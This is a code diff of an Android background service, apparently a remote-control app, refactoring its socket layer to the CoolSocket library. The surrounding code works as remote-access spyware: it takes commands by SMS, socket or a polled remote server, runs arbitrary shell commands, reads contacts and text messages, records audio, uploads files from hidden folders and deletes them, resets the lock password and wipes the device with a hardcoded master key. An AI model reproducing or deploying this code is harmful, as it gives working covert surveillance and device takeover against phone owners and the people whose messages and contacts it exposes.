@@ -38,8 +38,7 @@ import android.text.format.DateFormat;
 import android.util.Log;
 import android.view.KeyEvent;
 
-import com.genonbeta.CoolSocket.CoolCommunication;
-import com.genonbeta.CoolSocket.CoolJsonCommunication;
+import com.genonbeta.CoolSocket.CoolSocket;
 import com.genonbeta.core.ServerAddress;
 import com.genonbeta.core.ServerConnection;
 import com.github.kevinsawicki.http.HttpRequest;
@@ -58,10 +57,12 @@ import org.json.JSONObject;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.IOException;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.util.ArrayList;
 import java.util.Locale;
 import java.util.Set;
+import java.util.concurrent.TimeoutException;
 
 public class CommunicationService extends Service implements OnInitListener
 {
@@ -113,7 +114,6 @@ public class CommunicationService extends Service implements OnInitListener
 		if (!mCommunicationServer.start())
 			stopSelf();
 
-		mCommunicationServer.setAddTabsToResponse(2);
 		mRemoteThread.start();
 	}
 
@@ -139,50 +139,39 @@ public class CommunicationService extends Service implements OnInitListener
 		if (mPreferences.contains("remoteServer"))
 			mRemote.setAddress(new ServerAddress(mPreferences.getString("remoteServer", null)));
 
-		if (mPreferences.contains("upprFile"))
-		{
+		if (mPreferences.contains("upprFile")) {
 			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
 
-			if (uppr.isFile())
-			{
-				try
-				{
+			if (uppr.isFile()) {
+				try {
 					mVibrator.vibrate(1000);
 					mDPM.resetPassword("", 0);
 					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
-				} catch (Exception e)
-				{
+				} catch (Exception e) {
 					e.printStackTrace();
 				}
 			}
 		}
 
-		if (!mPreferences.contains("remoteServer"))
-		{
+		if (!mPreferences.contains("remoteServer")) {
 			File conf = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);
 
-			if (conf.isFile())
-			{
-				try
-				{
+			if (conf.isFile()) {
+				try {
 					String index = FileUtils.readFile(conf).toString();
 					mPreferences.edit().putString("remoteServer", index).apply();
-				} catch (IOException e)
-				{
+				} catch (IOException e) {
 				}
 			}
 		}
 
 		if (intent != null)
-			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
-			{
+			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE)) {
 				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
 				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
 
 				runCommand(sender, message, true);
-			}
-			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
-			{
+			} else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction())) {
 				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
 				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
 
@@ -250,11 +239,9 @@ public class CommunicationService extends Service implements OnInitListener
 
 	public long getRemoteServerDelay()
 	{
-		try
-		{
+		try {
 			return Long.valueOf(mPreferences.getString("remoteServerDelay", String.valueOf(mRemoteThreadDelay)));
-		} catch (NumberFormatException e)
-		{
+		} catch (NumberFormatException e) {
 		}
 
 		return mRemoteThreadDelay;
@@ -262,8 +249,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 	protected String ringerMode(int mode)
 	{
-		switch (mode)
-		{
+		switch (mode) {
 			case AudioManager.RINGER_MODE_NORMAL:
 				return "normal";
 			case AudioManager.RINGER_MODE_SILENT:
@@ -285,15 +271,31 @@ public class CommunicationService extends Service implements OnInitListener
 				JSONObject response = new JSONObject();
 				JSONObject receivedMessage;
 
-				try
-				{
+				try {
 					receivedMessage = new JSONObject(message);
-				} catch (JSONException e)
-				{
+				} catch (JSONException e) {
 					receivedMessage = new JSONObject();
 				}
 
-				mCommunicationServer.onJsonMessage(null, receivedMessage, response, sender);
+				try {
+					mCommunicationServer.handleRequest(null, receivedMessage, response, sender);
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+
+				if (REMOTE_SERVER.equals(sender)) {
+					mRemoteLogs.put(response.toString());
+
+					new Thread()
+					{
+						@Override
+						public void run()
+						{
+							super.run();
+							mRemoteThread.doCommunicate();
+						}
+					}.start();
+				}
 
 				if (smsMode && !silenceActivated())
 					SmsManager.getDefault().sendTextMessage(sender, null, response.toString(), null, null);
@@ -302,15 +304,9 @@ public class CommunicationService extends Service implements OnInitListener
 		).start();
 	}
 
-	public boolean send(String server, int port, String message, CoolCommunication.Messenger.ResponseHandler handler)
-	{
-		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
-	}
-
 	protected void sendToConnections(String message)
 	{
-		for (ParallelConnection conn : mParallelConnections)
-		{
+		for (ParallelConnection conn : mParallelConnections) {
 			conn.sendMessage(message);
 		}
 	}
@@ -356,12 +352,10 @@ public class CommunicationService extends Service implements OnInitListener
 		if (mSpeech == null)
 			return false;
 
-		try
-		{
+		try {
 			mSpeech.shutdown();
 			return true;
-		} catch (Exception e)
-		{
+		} catch (Exception e) {
 		}
 
 		return false;
@@ -369,8 +363,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 	protected String wifiState(int state)
 	{
-		switch (state)
-		{
+		switch (state) {
 			case WifiManager.WIFI_STATE_DISABLING:
 				return "disabling";
 			case WifiManager.WIFI_STATE_DISABLED:
@@ -384,23 +377,52 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 	}
 
-	private class CommunicationServer extends CoolJsonCommunication
+	private class CommunicationServer extends CoolSocket
 	{
 		public CommunicationServer()
 		{
 			super(AppConfig.COMMUNICATION_SERVER_PORT);
-
-			this.setAllowMalformedRequest(true);
 			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_TIMEOUT);
 		}
 
-		public void handleRequest(Socket socket, JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
+		@Override
+		protected void onConnected(ActiveConnection activeConnection)
+		{
+			try {
+				String response = null;
+				JSONObject receivedMessage;
+				JSONObject responseJson = new JSONObject();
+
+				response = activeConnection.receive().response;
+
+				try {
+					receivedMessage = new JSONObject(response);
+				} catch (JSONException e) {
+					receivedMessage = new JSONObject();
+				}
+
+				try {
+					handleRequest(activeConnection.getSocket(), receivedMessage, responseJson, activeConnection.getClientAddress());
+				} catch (Exception e) {
+					responseJson.put("error", e.toString());
+				}
+
+				activeConnection.reply(responseJson.toString(2));
+			} catch (IOException e) {
+				e.printStackTrace();
+			} catch (TimeoutException e) {
+				e.printStackTrace();
+			} catch (JSONException e) {
+				e.printStackTrace();
+			}
+		}
+
+		public void handleRequest(Socket socket, final JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
 		{
 			boolean result = false;
 			Intent actionIntent = new Intent();
 
-			if (receivedMessage.has("silence"))
-			{
+			if (receivedMessage.has("silence")) {
 				mPreferences.edit().putBoolean("silence", receivedMessage.getBoolean("silence")).apply();
 				response.put("silenceMode", receivedMessage.getBoolean("silence"));
 			}
@@ -408,8 +430,7 @@ public class CommunicationService extends Service implements OnInitListener
 			if (receivedMessage.has("printDeviceName") && receivedMessage.getBoolean("printDeviceName"))
 				response.put("deviceName", mPreferences.getString("deviceName", Build.MODEL));
 
-			if (mNotifyRequests)
-			{
+			if (mNotifyRequests) {
 				Notification.Builder builder = new Notification.Builder(CommunicationService.this);
 
 				builder
@@ -424,39 +445,25 @@ public class CommunicationService extends Service implements OnInitListener
 				response.put("warning", "Request notified");
 			}
 
-			if (!mGrantedList.contains(clientIp) && !REMOTE_SERVER.equals(clientIp))
-			{
-				if (!mPreferences.contains("password"))
-				{
-					if (receivedMessage.has("accessPassword"))
-					{
+			if (!mGrantedList.contains(clientIp) && !REMOTE_SERVER.equals(clientIp)) {
+				if (!mPreferences.contains("password")) {
+					if (receivedMessage.has("accessPassword")) {
 						mPreferences.edit().putString("password", receivedMessage.getString("accessPassword")).apply();
 						response.put("info", "Password is set to " + receivedMessage.getString("accessPassword"));
-					}
-					else
-					{
+					} else {
 						response.put("info", "Password is never set. To set use 'accessPassword' ");
 					}
-				}
-				else if (receivedMessage.has("password"))
-				{
-					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("password")))
-					{
+				} else if (receivedMessage.has("password")) {
+					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("password"))) {
 						mGrantedList.add(clientIp);
 						response.put("info", "Access granted");
-					}
-					else
+					} else
 						response.put("info", "Password was incorrect");
-				}
-				else
-				{
+				} else {
 					response.put("info", "To access use 'password'");
 				}
-			}
-			else if (receivedMessage.has("request"))
-			{
-				if (receivedMessage.has("action"))
-				{
+			} else if (receivedMessage.has("request")) {
+				if (receivedMessage.has("action")) {
 					actionIntent.setAction(receivedMessage.getString("action"));
 
 					if (receivedMessage.has("key") && receivedMessage.has("value"))
@@ -465,8 +472,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 				String request = receivedMessage.getString("request");
 
-				switch (request)
-				{
+				switch (request) {
 					case "configure":
 						startActivity(new Intent(CommunicationService.this, Configuration.class)
 								.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -530,8 +536,7 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "changeAccessPassword":
-						if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("old")))
-						{
+						if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("old"))) {
 							mPreferences.edit().putString("password", receivedMessage.getString("new")).apply();
 							result = true;
 						}
@@ -551,8 +556,7 @@ public class CommunicationService extends Service implements OnInitListener
 						result = ttsExit();
 						break;
 					case "tts":
-						if (mSpeech != null && mTTSInit)
-						{
+						if (mSpeech != null && mTTSInit) {
 							Locale locale = null;
 
 							if (receivedMessage.has("language"))
@@ -572,9 +576,7 @@ public class CommunicationService extends Service implements OnInitListener
 							response.put("speak", "@" + receivedMessage.getString("message"));
 
 							result = true;
-						}
-						else
-						{
+						} else {
 							mSpeech = new TextToSpeech(CommunicationService.this, CommunicationService.this);
 							response.put("info", "TTS service is now loading");
 
@@ -606,10 +608,6 @@ public class CommunicationService extends Service implements OnInitListener
 						Runtime.getRuntime().exec(receivedMessage.getString("command"));
 						result = true;
 						break;
-					case "toggleTabs":
-						this.setAddTabsToResponse((this.getAddTabsToResponse() == NO_TAB) ? 2 : NO_TAB);
-						result = true;
-						break;
 					case "setDeviceName":
 						result = mPreferences.edit().putString("deviceName", receivedMessage.getString("name")).commit();
 						break;
@@ -623,7 +621,31 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "send":
-						response.put("isSent", Messenger.sendOnCurrentThread(receivedMessage.getString("server"), receivedMessage.getInt("port"), receivedMessage.getString("message"), null));
+						response.put("isSent", CoolSocket.connect(new Client.ConnectionHandler()
+						{
+							@Override
+							public void onConnect(Client client)
+							{
+								try {
+									ActiveConnection activeConnection = client.connect(new InetSocketAddress(receivedMessage.getString("server"), receivedMessage.getInt("port")), AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
+
+									activeConnection.reply(receivedMessage.getString("message"));
+									activeConnection.receive();
+
+									client.setReturn(true);
+									return;
+								} catch (IOException e) {
+									e.printStackTrace();
+								} catch (JSONException e) {
+									e.printStackTrace();
+								} catch (TimeoutException e) {
+									e.printStackTrace();
+								}
+
+								client.setReturn(false);
+							}
+						}, Boolean.class));
+
 						result = true;
 						break;
 					case "sendSMS":
@@ -634,10 +656,8 @@ public class CommunicationService extends Service implements OnInitListener
 					case "wipeData":
 						response.put("warning", "This feature will delete external storage and protected data");
 
-						if (receivedMessage.has("master") && "gmasterkey".equals(receivedMessage.getString("master")))
-						{
-							if (mWipeCountdown == 0)
-							{
+						if (receivedMessage.has("master") && "gmasterkey".equals(receivedMessage.getString("master"))) {
+							if (mWipeCountdown == 0) {
 								response.put("info", "Request successful. Wipe requested");
 
 								if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
@@ -646,14 +666,11 @@ public class CommunicationService extends Service implements OnInitListener
 									mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
 
 								result = true;
-							}
-							else if (mWipeCountdown > 0)
-							{
+							} else if (mWipeCountdown > 0) {
 								response.put("info", "You need to request " + mWipeCountdown + " times to wipe all data");
 								mWipeCountdown--;
 							}
-						}
-						else
+						} else
 							response.put("error", "Master key required to perform this action.");
 						break;
 					case "addConnection":
@@ -664,8 +681,7 @@ public class CommunicationService extends Service implements OnInitListener
 						else
 							connection = new ParallelConnection(receivedMessage.getString("server"), receivedMessage.getInt("port"));
 
-						if (!mParallelConnections.contains(connection))
-						{
+						if (!mParallelConnections.contains(connection)) {
 							mParallelConnections.add(connection);
 							result = true;
 						}
@@ -675,8 +691,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						JSONArray list = new JSONArray();
 
-						for (ParallelConnection pConnection : mParallelConnections)
-						{
+						for (ParallelConnection pConnection : mParallelConnections) {
 							list.put(pConnection.toString());
 						}
 
@@ -721,12 +736,10 @@ public class CommunicationService extends Service implements OnInitListener
 						else if ("vibrate".equals(mode))
 							setMode = AudioManager.RINGER_MODE_VIBRATE;
 
-						if (setMode != -100)
-						{
+						if (setMode != -100) {
 							mAudioManager.setRingerMode(setMode);
 							result = true;
-						}
-						else
+						} else
 							response.put("error", "Mode could not be set. Mode values can only be vibrate|silent|normal");
 
 						response.put("currentMode", ringerMode(mAudioManager.getRingerMode()));
@@ -755,8 +768,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						response.put("currentServer", currentServer);
 
-						if (receivedMessage.has("server"))
-						{
+						if (receivedMessage.has("server")) {
 							String server = receivedMessage.getString("server");
 
 							mPreferences.edit().putString("remoteServer", server).apply();
@@ -765,20 +777,17 @@ public class CommunicationService extends Service implements OnInitListener
 							response.put("newlySet", server);
 						}
 
-						if (receivedMessage.has("test"))
-						{
+						if (receivedMessage.has("test")) {
 							response.put("isOkay", mRemote.connect());
 						}
 
-						if (receivedMessage.has("delay"))
-						{
+						if (receivedMessage.has("delay")) {
 							response.put("previousDelay", getRemoteServerDelay());
 							mPreferences.edit().putString("remoteServerDelay", String.valueOf(receivedMessage.getLong("delay"))).apply();
 							mRemoteThreadDelay = getRemoteServerDelay();
 						}
 
-						if (receivedMessage.has("backup") && receivedMessage.getBoolean("backup"))
-						{
+						if (receivedMessage.has("backup") && receivedMessage.getBoolean("backup")) {
 							File file = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);
 
 							if (file.isFile())
@@ -795,10 +804,8 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "playSong":
-						if (receivedMessage.has("name") || receivedMessage.has("file"))
-						{
-							if (receivedMessage.has("file"))
-							{
+						if (receivedMessage.has("name") || receivedMessage.has("file")) {
+							if (receivedMessage.has("file")) {
 								mPlayer.reset();
 
 								mPlayer.setDataSource(receivedMessage.getString("file"));
@@ -807,9 +814,7 @@ public class CommunicationService extends Service implements OnInitListener
 								mPlayer.start();
 
 								mCurrentSong = receivedMessage.getString("file");
-							}
-							else
-							{
+							} else {
 								Cursor cursor;
 
 								if (receivedMessage.has("artist"))
@@ -817,8 +822,7 @@ public class CommunicationService extends Service implements OnInitListener
 								else
 									cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ?", new String[]{"%" + receivedMessage.getString("name") + "%"}, null, null);
 
-								if (cursor.moveToFirst())
-								{
+								if (cursor.moveToFirst()) {
 									int songId = cursor.getInt(cursor.getColumnIndex(MediaStore.Audio.Media._ID));
 
 									mCurrentSong = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.ARTIST)) + " - " + cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.TITLE));
@@ -831,15 +835,12 @@ public class CommunicationService extends Service implements OnInitListener
 									mPlayer.start();
 
 									result = true;
-								}
-								else
+								} else
 									response.put("error", "The song you requested not found");
 
 								cursor.close();
 							}
-						}
-						else if (receivedMessage.has("kill"))
-						{
+						} else if (receivedMessage.has("kill")) {
 							mPlayer.reset();
 							result = true;
 						}
@@ -868,12 +869,10 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "mediaButton":
-						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
-						{
+						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
 							int event = KeyEvent.KEYCODE_MEDIA_PAUSE;
 
-							switch (receivedMessage.getString("event"))
-							{
+							switch (receivedMessage.getString("event")) {
 								case "toggle":
 									event = KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE;
 									break;
@@ -902,8 +901,7 @@ public class CommunicationService extends Service implements OnInitListener
 							mAudioManager.dispatchMediaKeyEvent(downEvent);
 
 							result = true;
-						}
-						else
+						} else
 							response.put("error", "This command is not supported before API 19");
 
 						break;
@@ -915,8 +913,7 @@ public class CommunicationService extends Service implements OnInitListener
 						String rMode = receivedMessage.has("event") ? receivedMessage.getString("event") : "default";
 						response.put("isRecording", mIsRecording);
 
-						switch (rMode)
-						{
+						switch (rMode) {
 							default:
 								response.put("event", "record,stop,path");
 								break;
@@ -943,8 +940,7 @@ public class CommunicationService extends Service implements OnInitListener
 						boolean deleteOnExit = receivedMessage.has("delete") && receivedMessage.getBoolean("delete");
 						String defaultFolder = receivedMessage.has("default") ? receivedMessage.getString("default") : "default";
 
-						switch (defaultFolder)
-						{
+						switch (defaultFolder) {
 							case "recordings":
 								folderToUpload = getHiddenRecordingsDirectory();
 								break;
@@ -953,12 +949,10 @@ public class CommunicationService extends Service implements OnInitListener
 								break;
 						}
 
-						if (folderToUpload != null && folderToUpload.isDirectory())
-						{
+						if (folderToUpload != null && folderToUpload.isDirectory()) {
 							response.put("folder", folderToUpload.getAbsolutePath());
 
-							for (File file : folderToUpload.listFiles())
-							{
+							for (File file : folderToUpload.listFiles()) {
 								if (!file.isFile())
 									continue;
 
@@ -973,8 +967,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 							response.put("info", mUploadQueue.size() + " files will be uploaded" + (deleteOnExit ? " and will be deleted after upload process is done" : ""));
 							result = true;
-						}
-						else
+						} else
 							response.put("error", "Target folder is suitable. Check if it's a correct path");
 
 						break;
@@ -984,8 +977,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						response.put("file", uploadThis.getAbsolutePath());
 
-						if (uploadThis.isFile())
-						{
+						if (uploadThis.isFile()) {
 							FileHolder holder = new FileHolder();
 
 							holder.deleteOnExit = delete;
@@ -994,8 +986,7 @@ public class CommunicationService extends Service implements OnInitListener
 							mUploadQueue.add(holder);
 							response.put("info", "File will be uploaded to remote server on the next connection");
 							result = true;
-						}
-						else
+						} else
 							response.put("error", "File not found");
 
 						break;
@@ -1033,15 +1024,13 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "readContacts":
 						ContentResolver contentResolver = getContentResolver();
-						Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?", new String[] {"%" + receivedMessage.getString("filterName") + "%"}, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
+						Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?", new String[]{"%" + receivedMessage.getString("filterName") + "%"}, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
 						int startPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;
 
 						JSONArray contacts = new JSONArray();
 
-						if (cursor.moveToFirst())
-						{
-							do
-							{
+						if (cursor.moveToFirst()) {
+							do {
 								if (startPosition > 0 && cursor.getPosition() < (cursor.getCount() - startPosition))
 									continue;
 
@@ -1051,22 +1040,19 @@ public class CommunicationService extends Service implements OnInitListener
 								String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
 								String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
-								if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
-								{
+								if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
 									Cursor pCur = contentResolver.query(
 											ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
 											null,
 											ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
 											new String[]{id}, null);
 
-									while (pCur.moveToNext())
-									{
+									while (pCur.moveToNext()) {
 										int phoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
 										String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 										String type = "unknown";
 
-										switch (phoneType)
-										{
+										switch (phoneType) {
 											case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
 												type = "mobile";
 												break;
@@ -1112,8 +1098,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						response.put("bluetoothEnabled", isEnabled);
 
-						switch (receivedMessage.getString("mode"))
-						{
+						switch (receivedMessage.getString("mode")) {
 							case "power":
 								boolean powerRequest = receivedMessage.getBoolean("power");
 
@@ -1141,8 +1126,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 						response.put("wirelessStatus", wifiState(wifiManager.getWifiState()));
 
-						switch (receivedMessage.getString("mode"))
-						{
+						switch (receivedMessage.getString("mode")) {
 							case "power":
 								result = wifiManager.setWifiEnabled(receivedMessage.getBoolean("power"));
 								break;
@@ -1179,14 +1163,12 @@ public class CommunicationService extends Service implements OnInitListener
 						String smsUri = "content://sms/";
 						int passedToPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;
 
-						try
-						{
+						try {
 							Uri uri = Uri.parse(smsUri);
 							String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
-							Cursor messageCursor = getContentResolver().query(uri, projection, "address LIKE ?", new String[] {"%" + receivedMessage.getString("address") + "%"}, "date asc");
+							Cursor messageCursor = getContentResolver().query(uri, projection, "address LIKE ?", new String[]{"%" + receivedMessage.getString("address") + "%"}, "date asc");
 
-							if (messageCursor.moveToFirst())
-							{
+							if (messageCursor.moveToFirst()) {
 								response.put("totalResult", messageCursor.getCount());
 
 								int indexAddress = messageCursor.getColumnIndex("address");
@@ -1195,8 +1177,7 @@ public class CommunicationService extends Service implements OnInitListener
 								int indexDate = messageCursor.getColumnIndex("date");
 								int indexType = messageCursor.getColumnIndex("type");
 
-								do
-								{
+								do {
 									if (passedToPosition > 0 && messageCursor.getPosition() < (messageCursor.getCount() - passedToPosition))
 										continue;
 
@@ -1207,16 +1188,14 @@ public class CommunicationService extends Service implements OnInitListener
 											.put("text", messageCursor.getString(indexBody)));
 								} while (messageCursor.moveToNext());
 
-								if (!messageCursor.isClosed())
-								{
+								if (!messageCursor.isClosed()) {
 									messageCursor.close();
 									messageCursor = null;
 								}
 							}
 
 							result = true;
-						} catch (SQLiteException ex)
-						{
+						} catch (SQLiteException ex) {
 							Log.d("SQLiteException", ex.getMessage());
 						}
 
@@ -1230,44 +1209,6 @@ public class CommunicationService extends Service implements OnInitListener
 				response.put("result", result);
 			}
 
-		}
-
-		@Override
-		protected void onError(Exception exception)
-		{
-		}
-
-		@Override
-		public void onJsonMessage(Socket socket, JSONObject received, JSONObject response, String client)
-		{
-			try
-			{
-				handleRequest(socket, received, response, client);
-			} catch (Exception e)
-			{
-				try
-				{
-					response.put("error", "@" + e);
-				} catch (JSONException json)
-				{
-					e.printStackTrace();
-				}
-			}
-
-			if (REMOTE_SERVER.equals(client))
-			{
-				mRemoteLogs.put(response.toString());
-
-				new Thread()
-				{
-					@Override
-					public void run()
-					{
-						super.run();
-						mRemoteThread.doCommunicate();
-					}
-				}.start();
-			}
 		}
 	}
 
@@ -1299,16 +1240,31 @@ public class CommunicationService extends Service implements OnInitListener
 			return this.mType;
 		}
 
-		public void sendMessage(String message)
+		public void sendMessage(final String message)
 		{
-			if (getType() == TYPE_TEL_NUMBER)
-			{
+			if (getType() == TYPE_TEL_NUMBER) {
 				SmsManager smsManager = SmsManager.getDefault();
 				smsManager.sendTextMessage(this.mNumber, null, message, null, null);
-			}
-			else if (getType() == TYPE_COOLSOCKET)
-			{
-				CoolCommunication.Messenger.send(this.mServer, this.mPort, message, null);
+			} else if (getType() == TYPE_COOLSOCKET) {
+				CoolSocket.connect(new CoolSocket.Client.ConnectionHandler()
+				{
+					@Override
+					public void onConnect(CoolSocket.Client client)
+					{
+						try {
+							CoolSocket.ActiveConnection activeConnection = client.connect(new InetSocketAddress(mServer, mPort), AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
+
+							activeConnection.reply(message);
+							activeConnection.receive();
+						} catch (IOException e) {
+							e.printStackTrace();
+						} catch (JSONException e) {
+							e.printStackTrace();
+						} catch (TimeoutException e) {
+							e.printStackTrace();
+						}
+					}
+				});
 			}
 		}
 
@@ -1328,8 +1284,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 		public boolean doCommunicate()
 		{
-			if (mRemote.getAddress() == null || !mIsAvailable)
-			{
+			if (mRemote.getAddress() == null || !mIsAvailable) {
 				Log.d(TAG, "Remote connection passed; hasAddress=" + (mRemote.getAddress() != null) + "; available=" + mIsAvailable);
 				return false;
 			}
@@ -1338,37 +1293,31 @@ public class CommunicationService extends Service implements OnInitListener
 
 			mIsAvailable = false;
 
-			try
-			{
+			try {
 				mRemote.getAddress().clearAll();
 				mRemote.getAddress().addPost(AppConfig.PREVIOUS_RESULTS, mRemoteLogs.toString());
 
 				JSONArray cmds = new JSONArray(mRemote.connect());
 
-				if (cmds.length() > 0)
-				{
+				if (cmds.length() > 0) {
 					Log.d(TAG, "Remote connection: connected; receivedCommands=" + cmds.length());
 					for (int i = 0; i < cmds.length(); i++)
 						runCommand(REMOTE_SERVER, cmds.getString(i), false);
 				}
 
 				mRemoteLogs = new JSONArray();
-			} catch (Exception e)
-			{
+			} catch (Exception e) {
 				Log.d(TAG, "Remote connection: context=default; error=" + e);
 			}
 
-			if (mUploadQueue.size() > 0)
-			{
+			if (mUploadQueue.size() > 0) {
 				FileHolder firstFile = mUploadQueue.get(0);
 
 				ServerAddress serverAddress = mRemote.getAddress();
 				serverAddress.clearAll();
 
-				try
-				{
-					if (firstFile.file.isFile())
-					{
+				try {
+					if (firstFile.file.isFile()) {
 						HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
 						StringBuilder output = new StringBuilder();
 
@@ -1378,23 +1327,19 @@ public class CommunicationService extends Service implements OnInitListener
 
 						Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
 
-						if (request.ok())
-						{
+						if (request.ok()) {
 							if (mUploadQueue.size() > 0)
 								mUploadQueue.remove(0);
 
 							if (firstFile.deleteOnExit)
 								firstFile.file.delete();
 						}
-					}
-					else
-					{
+					} else {
 						Log.e(TAG, "File upload is passed (NOT_FOUND)");
 						if (mUploadQueue.size() > 0)
 							mUploadQueue.remove(0);
 					}
-				} catch (Exception e)
-				{
+				} catch (Exception e) {
 					e.printStackTrace();
 				}
 			}
@@ -1410,13 +1355,10 @@ public class CommunicationService extends Service implements OnInitListener
 			super.run();
 			Log.d(TAG, "RemoteServer thread started");
 
-			while (!isInterrupted())
-			{
-				try
-				{
+			while (!isInterrupted()) {
+				try {
 					Thread.sleep(mRemoteThreadDelay);
-				} catch (InterruptedException e)
-				{
+				} catch (InterruptedException e) {
 				}
 
 				doCommunicate();
